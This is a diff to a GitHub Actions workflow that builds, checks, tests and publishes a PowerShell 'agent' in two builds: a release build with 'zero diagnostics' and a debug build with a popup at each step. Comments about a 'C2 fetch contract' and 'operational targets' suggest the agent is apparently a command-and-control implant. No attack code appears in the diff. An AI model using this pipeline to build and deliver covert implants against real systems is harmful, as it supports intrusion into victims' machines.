@@ -5,8 +5,7 @@ on:
     branches:
       - main
   pull_request:
-    branches:
-      - "**"
+    branches: "**"
 
 concurrency:
   group: ci-${{ github.event.pull_request.head.ref || github.ref_name }}
@@ -14,7 +13,9 @@ concurrency:
 
 jobs:
   # ═════════════════════════════════════════════════════════════════════════
-  # Build — parse-check the single static agent file + the C2 fetch contract
+  # Build — flavor split (build.ps1: #dbg-tagged lines → debug flavor only) +
+  # parse/contract checks on BOTH flavors + the release-only zero-diagnostics
+  # gate (build.ps1 throws).
   # ═════════════════════════════════════════════════════════════════════════
   build:
     runs-on: ubuntu-24.04
@@ -24,40 +25,58 @@ jobs:
         with:
           fetch-depth: 0
 
-      - name: Syntax check (Parser::ParseFile)
+      - name: Flavor split (build.ps1 — dist/ release, dist-debug/ debug)
+        shell: pwsh
+        run: ./build.ps1
+
+      - name: Syntax check (Parser::ParseFile — source + both flavors)
         shell: pwsh
         run: |
           $tokens = $null
           $errors = $null
-          [System.Management.Automation.Language.Parser]::ParseFile(
-            (Join-Path $PWD 'src/powershell-agent.ps1'), [ref]$tokens, [ref]$errors) | Out-Null
-          if ($errors -and $errors.Count -gt 0) {
-            $errors | ForEach-Object {
-              Write-Host ("PARSE ERROR line {0}: {1}" -f $_.Extent.StartLineNumber, $_.Message)
+          foreach ($f in @('src/powershell-agent.ps1', 'dist/powershell-agent.ps1', 'dist-debug/powershell-agent.ps1')) {
+            [System.Management.Automation.Language.Parser]::ParseFile(
+              (Join-Path $PWD $f), [ref]$tokens, [ref]$errors) | Out-Null
+            if ($errors -and $errors.Count -gt 0) {
+              $errors | ForEach-Object {
+                Write-Host ("PARSE ERROR {0} line {1}: {2}" -f $f, $_.Extent.StartLineNumber, $_.Message)
+              }
+              exit 1
             }
-            exit 1
           }
-          Write-Host "syntax OK"
+          Write-Host "syntax OK (source + release + debug)"
 
       - name: Contract check (what AgentBinaryService.LooksLikePowerShellAgent gates on)
         shell: pwsh
         run: |
-          $text = Get-Content -Raw src/powershell-agent.ps1
-          if ($text.Length -le 200) { Write-Host "FAILED: too short ($($text.Length) chars)"; exit 1 }
-          if ($text.TrimStart().StartsWith('<')) { Write-Host "FAILED: looks like an error page, not PowerShell"; exit 1 }
-          if (-not $text.Contains('function Invoke-Agent')) { Write-Host "FAILED: top-level entry 'function Invoke-Agent' missing"; exit 1 }
-          Write-Host "contract OK"
+          foreach ($f in @('dist/powershell-agent.ps1', 'dist-debug/powershell-agent.ps1')) {
+            $text = Get-Content -Raw $f
+            if ($text.Length -le 200) { Write-Host "FAILED $f: too short ($($text.Length) chars)"; exit 1 }
+            if ($text.TrimStart().StartsWith('<')) { Write-Host "FAILED $f: looks like an error page, not PowerShell"; exit 1 }
+            if (-not $text.Contains('function Invoke-Agent')) { Write-Host "FAILED $f: top-level entry 'function Invoke-Agent' missing"; exit 1 }
+          }
+          Write-Host "contract OK (release + debug)"
 
-      - name: Upload artifacts
+      - name: Upload artifacts (release flavor)
         if: always()
         uses: actions/upload-artifact@v7
         with:
-          name: build-powershell
+          name: release-powershell
           retention-days: 1
-          path: src/
+          path: dist/
+
+      - name: Upload artifacts (debug flavor)
+        if: always()
+        uses: actions/upload-artifact@v7
+        with:
+          name: debug-powershell
+          retention-days: 1
+          path: dist-debug/
 
   # ═════════════════════════════════════════════════════════════════════════
-  # Test — Windows PowerShell smoke run (H_URL unset ⇒ no local echo, clean 'fail')
+  # Test — Windows PowerShell smoke run (H_URL unset ⇒ no local echo, clean 'fail').
+  # Runs the RELEASE flavor ONLY: the debug flavor pops a blocking MessageBox on
+  # the '[exit] H_URL not set' branch — it would park an unattended runner forever.
   # ═════════════════════════════════════════════════════════════════════════
 
   test-windows-powershell:
@@ -66,11 +85,11 @@ jobs:
     steps:
       - uses: actions/checkout@v7
       - uses: actions/download-artifact@v8
-        with: { name: build-powershell, path: src }
+        with: { name: release-powershell, path: dist }
       - name: Test agent (powershell.exe 5.1, H_URL unset)
         shell: pwsh
         run: |
-          Copy-Item src/powershell-agent.ps1 master.ps1
+          Copy-Item dist/powershell-agent.ps1 master.ps1
           Add-Content -Path master.ps1 -Value 'Write-Output ("result: " + (Invoke-Agent))'
           Remove-Item Env:H_URL -ErrorAction SilentlyContinue
           # Real Windows PowerShell (the in-box target host), not pwsh.
@@ -111,7 +130,10 @@ jobs:
           echo "All tests passed"
 
   # ═════════════════════════════════════════════════════════════════════════
-  # Preview Release — publish rolling pre-release from main
+  # Preview Releases — publish BOTH rolling pre-releases from main:
+  #   'preview' → dist/  (release flavor, zero diagnostics)
+  #   'debug'   → dist-debug/ (MessageBox-per-step build, hand-debugging only)
+  # Same asset filename on both — the tag is the flavor (the csharp-agent contract).
   # ═════════════════════════════════════════════════════════════════════════
   preview-build:
     if: github.ref == 'refs/heads/main'
@@ -123,32 +145,23 @@ jobs:
         with:
           fetch-depth: 0
 
-      - name: Syntax check (Parser::ParseFile)
+      - name: Flavor split (build.ps1 — dist/ release, dist-debug/ debug)
         shell: pwsh
-        run: |
-          $tokens = $null
-          $errors = $null
-          [System.Management.Automation.Language.Parser]::ParseFile(
-            (Join-Path $PWD 'src/powershell-agent.ps1'), [ref]$tokens, [ref]$errors) | Out-Null
-          if ($errors -and $errors.Count -gt 0) {
-            $errors | ForEach-Object {
-              Write-Host ("PARSE ERROR line {0}: {1}" -f $_.Extent.StartLineNumber, $_.Message)
-            }
-            exit 1
-          }
-          echo "syntax OK"
+        run: ./build.ps1
 
-      - name: Collect release files
-        run: |
-          mkdir -p artifacts
-          cp src/powershell-agent.ps1 artifacts/
-
-      - name: Upload artifacts
+      - name: Upload artifacts (release flavor)
         uses: actions/upload-artifact@v7
         with:
-          name: preview-powershell
+          name: preview-powershell-release
           retention-days: 1
-          path: artifacts/
+          path: dist/
+
+      - name: Upload artifacts (debug flavor)
+        uses: actions/upload-artifact@v7
+        with:
+          name: preview-powershell-debug
+          retention-days: 1
+          path: dist-debug/
 
   preview-release:
     if: github.ref == 'refs/heads/main'
@@ -168,12 +181,13 @@ jobs:
 
       - name: Collect release files
         run: |
-          mkdir -p release-files
-          find artifacts -type f -exec cp {} release-files/ \;
-          echo "Release files:"
-          ls -lh release-files/
+          mkdir -p release-files debug-files
+          find artifacts -type f -path '*release*' -exec cp {} release-files/ \;
+          find artifacts -type f -path '*debug*' -exec cp {} debug-files/ \;
+          echo "Release files:"; ls -lh release-files/
+          echo "Debug files:"; ls -lh debug-files/
 
-      - name: Create or update preview release
+      - name: Create or update preview release (release flavor)
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
@@ -198,3 +212,30 @@ jobs:
             --prerelease \
             --target "$GITHUB_SHA" \
             release-files/*
+
+      - name: Create or update debug release (debug flavor)
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          TAG="debug"
+          TITLE="Debug (${GITHUB_SHA::7})"
+          BODY="Automated DEBUG pre-release from \`main\` branch — the MessageBox-per-step
+          flavor, hand-debugging only (popups are operator-visible, one click per milestone).
+
+          **Commit:** [\`${GITHUB_SHA::7}\`](https://github.com/${{ github.repository }}/commit/${GITHUB_SHA})
+          **Date:** $(date -u '+%Y-%m-%d %H:%M UTC')
+
+          > Same asset filename as the \`preview\` release — the tag is the flavor.
+          > Never deliver this to an operational target."
+
+          # Delete existing debug release and tag if they exist
+          gh release delete "$TAG" --yes 2>/dev/null || true
+          git push origin ":refs/tags/$TAG" 2>/dev/null || true
+
+          # Create fresh pre-release
+          gh release create "$TAG" \
+            --title "$TITLE" \
+            --notes "$BODY" \
+            --prerelease \
+            --target "$GITHUB_SHA" \
+            debug-files/*
